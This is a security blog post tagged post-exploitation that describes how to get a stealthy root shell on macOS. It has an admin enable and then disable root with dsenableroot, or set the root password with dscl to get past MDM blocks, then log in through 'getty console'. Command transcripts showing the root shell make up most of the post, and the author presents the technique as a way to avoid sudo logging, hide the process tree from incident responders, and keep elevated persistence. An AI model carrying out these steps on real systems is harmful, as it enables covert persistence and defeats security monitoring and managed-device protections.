---
author: n0ncetonic
layout: post
title: macOS Serial Console Login
tags: [MacOS, Post-Exploitation]
---

## Foreword ##
This short post documents a technique for authenticating as `root` on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the `root` user. For some added fun—and in keeping with Eric Raymond's *Rule of Diversity*–one of the procedures neuters a common mitigation against re-enabling the `root` user.

> Rule of Diversity
    Developers should design their programs to be flexible and open. This rule aims to make programs flexible, **allowing them to be used in ways other than those their developers intended**.
;)

## The route to root ##
Under a default installation of macOS any administratrative user can trivially enable (and disable) the `root` account via the [`dsenableroot(8)`][1] command.

> DESCRIPTION
     dsenableroot sets the password for the root account if enabling the root user account.  Otherwise, if disable [-d] is chosen, the root account passwords are removed and the root user is disabled.

When enabling the root user via `dsenableroot` you will be prompted for a "root password" but knowing the root password is not a requirement (and by default `root` does not have a password); anything you enter here will be accepted as the password for `root` so long as you don't fat-finger it when prompted to "verify root password".

```
user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Successfully enabled root user.
```

**Secret Squirrel Note** It's worth noting here that this was all done without running the `sudo` command which might otherwise raise a red flag on networks where users do not commonly run `sudo` or in cases where solutions such as Centrify have been deployed to trigger session recording when `dzdo`/`sudo` are run. One less data point for incident responders during post-mortem examination of a host.

Likewise it is similarly easy to disable the root user, allowing administrators to disable the root user after concluding its use.

```
user@blacksunlabs:~ $ dsenableroot -d
username = user
user password:

dsenableroot:: ***Successfully disabled root user.
```

### MDM: A protection ###
It is becoming more and more common to restrict enabling `root` for end-users on managed workstations. As most end-users have no need for explicitly logging in as `root`, this is considered good security hygiene.

In these situations, attempting to enable `root` via `dsenableroot` will produce an error such as this:

```
user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Failed to enable root user.
```

We will address the case of hardened workstations near the conclusion of this post. 

## The not so secret life of `getty`  ##

**History Lesson**
If you've had the pleasure of contracting tinnitus as a result of prolonged employment in a NOC, you are probably all too familiar with [`getty(8)`][2]. You've probably also made Null Modem cables out of speaker wire in a pinch. 

For those with limited familiarity with `getty`, don't worry. In a nutshell, `getty` is in charge of initializing a tty terminal, prompting for user credentials, and passing those credentials over to [`login(1)`][3] to handle the heavy lifting. More specifically, it allows system consoles, psuedo-terminals, or terminals to login to a local system over a non-graphical interface.

### A link to the past ###
In *much* older versions of macOS—think Mac OS X Jaguar and similar—it was possible to get access to the system console login by [entering ">console" as a username][4] on the graphical login screen. This functionality has long-since been removed but it got me wondering about the system console on modern macOS incarnations.

## PoC||GTFO ##
Now that the useful content of this post has been padded with enough background info to not fit in a tweet or two, let's get to the good bits.

The procedure on default or non-hardened workstations is quite simple: 
- `dsenableroot` to set a root password
- `dsenableroot -d` to disable the root account. It really shouldn't be enabled and upon cursory glance the environment mimicks a default system
- `/usr/libexec/getty console` to drop us into a system console login prompt. 

Once at a system console login prompt simply enter "root" as your login and when prompted, provide the password you set using `dsenableroot`.

```
user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Successfully enabled root user.
user@blacksunlabs:~ $ dsenableroot -d
username = user
user password:

dsenableroot:: ***Successfully disabled root user.
user@blacksunlabs:~ $ /usr/libexec/getty console
�
D�rwi�BSD�(black�sun�-labs���(tt��005��
�
lo�i�:�root�
            Password:
Last login: Sat Nov 17 12:53:32 on ttys004
blacksunlabs:~ root# id -a
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
blacksunlabs:~ root# exit
logout
```

There you go. Despite `root` being disabled by Directory Services, logging in via a serial connection such as the system console happily ignores Directory Services and presents us with a fully functional tty and shell. An added bonus is that we did not have to invoke `sudo`—or even be in the sudoers file 😉—and there is no cascading process tree connecting our root shell to the original user.

### Remember Churchill ###
> Don't take 'no' for an answer, never submit to failure. 
    - Winston Churchill

If you encountered that pesky "`dsenableroot:: ***Failed to enable root user.`" message when running `dsenableroot` remember the *Rule of Diversity* and add some Churchill for good measure. If the system says "no", use tools in a way developers hadn't intended and elbow security mitigations in the face for doubting your skills.

As was shown in the previous procedure, the only thing that's actually needed is a known password for the root user. While `dsenableroot` allows us to circumvent sudoers restrictions and cover our tracks a bit, it does still require knowing the password of a user with administrative permissions. 

Taking advantage of the fact that most macOS workstations follow the "single user administrator" model we have a few potential ways for leveraging our administrator user's credentials to set a password for the root user. 

[`dscl(1)`][5] is used here to mimick administrative best practices for managing macOS user credentials via Directory Services, but `sudo passwd root` would work just as well.

```
user@blacksunlabs:~ $ dsenableroot
username = user
user password:
root password:
verify root password:

dsenableroot:: ***Failed to enable root user.
user@blacksunlabs:~ $ sudo /usr/bin/dscl . -passwd /Users/root
Password:
New Password:
01:57:11 user@blacksunlabs:~ $ /usr/libexec/getty console
�
D�rwi�BSD�(black�sun�-labs���(tt��005��
�
lo�i�:�root�
            Password:
trogers-ltm:~ root# id -a
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
trogers-ltm:~ root# logout
```

From "Go To Hell!" to "Yo! Root Shell!" No sadfeels bourbon today, you just earned celebratory bourbon!
****

## Closing ##
Honestly I'm just glad I finally got around to writing this up. I had a need for a sneaky means of elevated persistence on a system and this idea occurred to me but as is common due to the mercurial nature of my work, the idea got shelved and priorities shifted constantly, and I never found myself in a situation formally investigate and document this technique.

Also, before i see the tweets, yes, it is possible to provide the `-u` admin username, `-p` admin password, and `-r` rootpassword as flags to `dsenableroot`, I personally prefer to be prompted interactively for these bits of information to avoid accidentally writing sensitive information to history files.

[1]:https://ss64.com/osx/dsenableroot.html
[2]:https://www.freebsd.org/cgi/man.cgi?query=getty&sektion=8&manpath=freebsd-release-ports
[3]:https://www.freebsd.org/cgi/man.cgi?query=login&sektion=1&apropos=0&manpath=FreeBSD+11.2-RELEASE+and+Ports
[4]:https://hints.macworld.com/article.php?story=20020318020806482
[5]:https://ss64.com/osx/dscl.html
